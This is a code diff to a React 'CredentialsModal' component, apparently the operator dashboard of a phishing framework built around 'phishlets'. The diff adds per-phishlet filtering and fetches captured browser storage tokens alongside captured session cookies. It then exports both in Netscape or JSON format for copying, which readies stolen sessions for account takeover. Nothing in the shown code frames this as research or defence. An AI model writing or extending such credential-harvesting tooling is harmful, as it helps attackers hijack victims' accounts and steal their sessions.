@@ -44,9 +44,10 @@ function toNetscapeFormat(cookies) {
     netscapeCookies.join("\n");
 }
 
-export default function CredentialsModal({ onClose }) {
+export default function CredentialsModal({ onClose, phishletKey }) {
   const { addToast } = useToast();
   const [credentials, setCredentials] = useState([]);
+  const [storageTokens, setStorageTokens] = useState([]);
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
   const [copied, setCopied] = useState(false);
@@ -55,14 +56,18 @@ export default function CredentialsModal({ onClose }) {
 
   useEffect(() => {
     fetchCredentials();
-  }, []);
+  }, [phishletKey]);
 
   async function fetchCredentials() {
     setLoading(true);
     setError("");
+    setStorageTokens([]);
     try {
+      const params = {};
+      if (phishletKey) params.key = phishletKey;
       const res = await axios.get(`${BASE}/api/credentials`, {
         headers: authHeaders(),
+        params,
       });
       const message = res.data.message || "";
       const containerMatch = message.match(/^([^\n]+)\n([\s\S]*)$/);
@@ -76,6 +81,15 @@ export default function CredentialsModal({ onClose }) {
         }
       } else {
         setCredentials([]);
+      }
+      if (phishletKey) {
+        try {
+          const storageRes = await axios.get(`${BASE}/api/phishlets/storage-tokens`, {
+            headers: authHeaders(),
+            params: { key: phishletKey },
+          });
+          setStorageTokens(storageRes.data.storage_tokens || []);
+        } catch {}
       }
     } catch (err) {
       setError(err.response?.data?.message || err.message || "Failed to fetch credentials");
@@ -95,15 +109,19 @@ export default function CredentialsModal({ onClose }) {
   }, [credentials, filterDomain]);
 
   function handleCopy() {
+    const allItems = [...filteredCredentials, ...storageTokens];
     const data = exportFormat === "netscape"
-      ? toNetscapeFormat(filteredCredentials)
-      : JSON.stringify(filteredCredentials, null, 2);
+      ? toNetscapeFormat(allItems)
+      : JSON.stringify(allItems, null, 2);
     navigator.clipboard.writeText(data).then(() => {
       setCopied(true);
       addToast(exportFormat === "netscape" ? "Netscape format copied!" : "JSON copied!", "success");
       setTimeout(() => setCopied(false), 2000);
     });
   }
+
+  const totalItems = credentials.length + storageTokens.length;
+  const totalFiltered = filteredCredentials.length + storageTokens.length;
 
   return createPortal(
     <div className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-4" onClick={onClose}>
@@ -118,7 +136,7 @@ export default function CredentialsModal({ onClose }) {
               Captured Credentials
             </h2>
             <span className="text-xs text-gray-500">
-              {filteredCredentials.length} / {credentials.length} cookies
+              {totalFiltered} / {totalItems} items ({credentials.length} cookies, {storageTokens.length} storage)
             </span>
           </div>
           <div className="flex items-center gap-2">
@@ -142,7 +160,7 @@ export default function CredentialsModal({ onClose }) {
             </select>
             <button
               onClick={handleCopy}
-              disabled={credentials.length === 0 || loading}
+              disabled={totalItems === 0 || loading}
               className="px-3 py-1.5 text-xs rounded bg-green-700 text-green-200 hover:bg-green-600 transition disabled:opacity-40"
             >
               {copied ? "Copied!" : "Copy All"}
@@ -162,23 +180,23 @@ export default function CredentialsModal({ onClose }) {
               <div className="text-gray-500 text-sm">Loading...</div>
             </div>
           ) : error ? (
-            <div className="flex items-center justify-center py-12">
+            <div className="flex flex-col items-center justify-center py-12">
               <div className="text-red-400 text-sm">{error}</div>
             </div>
-          ) : credentials.length === 0 ? (
+          ) : totalItems === 0 ? (
               <div className="flex flex-col items-center justify-center py-12 text-gray-500 text-sm">
                 <NavIcon name="cookie" className="w-12 h-12 mb-2 text-gray-600" />
-                <span>No cookies captured yet</span>
+                <span>No cookies or tokens captured yet</span>
               </div>
-          ) : filteredCredentials.length === 0 ? (
+          ) : totalFiltered === 0 ? (
             <div className="flex flex-col items-center justify-center py-12 text-gray-500 text-sm">
-              <span>No cookies for selected domain</span>
+              <span>No items for selected domain</span>
             </div>
           ) : (
             <pre className="text-xs text-green-300 whitespace-pre-wrap break-all font-mono bg-gray-950 p-3 rounded border border-gray-800 max-h-[60vh] overflow-y-auto">
               {exportFormat === "netscape"
-                ? toNetscapeFormat(filteredCredentials)
-                : JSON.stringify(filteredCredentials, null, 2)
+                ? toNetscapeFormat([...filteredCredentials, ...storageTokens])
+                : JSON.stringify([...filteredCredentials, ...storageTokens], null, 2)
               }
             </pre>
           )}
